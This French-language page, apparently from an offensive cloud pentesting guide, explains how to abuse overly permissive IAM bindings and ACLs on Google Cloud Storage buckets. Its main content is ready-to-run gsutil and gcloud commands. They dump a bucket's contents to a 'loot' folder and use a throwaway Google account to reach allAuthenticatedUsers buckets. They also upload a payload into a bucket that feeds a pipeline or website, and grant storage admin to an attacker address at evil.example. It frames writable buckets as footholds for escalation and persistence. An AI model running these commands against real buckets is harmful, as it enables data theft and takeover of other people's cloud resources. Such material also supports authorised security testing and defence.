---
title: "Accès : lire et écrire des objets via des IAM et ACL de bucket trop permissives"
order: 2
description: "Lire ou écrire des objets de bucket via des IAM de bucket trop permissives, des ACL héritées, ou des liaisons allUsers et allAuthenticatedUsers."
keywords:
  - IAM de bucket
  - ACL
  - allUsers
  - accès aux objets
  - accès uniforme
---

# Accès

Une fois qu'un bucket est trouvé, l'accès est une question d'autorisation : la politique IAM du bucket ou une ACL héritée accorde-t-elle à votre identité (ou à `allUsers`/`allAuthenticatedUsers`) un accès en lecture ou en écriture sur les objets. Les rôles de projet trop permissifs (`roles/storage.admin`, `roles/storage.objectViewer`) et les liaisons `allAuthenticatedUsers` oubliées constituent les gains les plus fréquents, et l'accès en écriture transforme le bucket en point d'ancrage lorsqu'un élément en aval fait confiance à son contenu.

## Lire des objets

```bash
# with any identity that holds objectViewer on the bucket or project
gsutil -m cp -r gs://<bucket> ./loot
gcloud storage cp --recursive gs://<bucket> ./loot

# allAuthenticatedUsers buckets open to any Google account at all
gsutil ls gs://<bucket>        # authenticate with a throwaway Google identity
```

## Trouver l'autorisation accordée

```bash
gsutil iam get gs://<bucket>                     # uniform bucket IAM
gsutil acl get gs://<bucket>                     # legacy object/bucket ACLs
# look for allUsers / allAuthenticatedUsers, or roles bound at the project
gcloud projects get-iam-policy <proj> --format=json | grep -i storage
```

## Écrire et prendre le contrôle

```bash
# write access to a bucket feeding a pipeline, website, or function source
gsutil cp payload gs://<bucket>/path/object
# if allUsers holds storage.buckets.setIamPolicy, grant yourself admin
gsutil iam ch user:you@evil.example:roles/storage.admin gs://<bucket>
```

## Notes d'exploitation

- L'accès uniforme au niveau du bucket ignore les ACL d'objet ; là où il est désactivé, une seule ACL d'objet lisible publiquement divulgue cet objet même dans un bucket privé.
- Un bucket accessible en écriture qui contient le code source d'une Cloud Function ou d'App Engine, un état Terraform, ou un site statique, constitue une surface d'escalade et de persistance, et pas seulement des données.
- `allAuthenticatedUsers` n'est pas public : il s'agit de tout compte Google, donc accessible avec n'importe quelle identité gratuite.

## Outils

- **gsutil / gcloud storage** : lecture, écriture et inspection IAM/ACL des objets.
- **GCPBucketBrute** : signale les buckets dont l'IAM est modifiable par l'attaquant.

## Références

- [HackTricks Cloud: GCP bucket privilege escalation](https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/index.html)
- [Google: Cloud Storage access control](https://cloud.google.com/storage/docs/access-control)
- [Hacking the Cloud: GCP](https://hackingthe.cloud/)
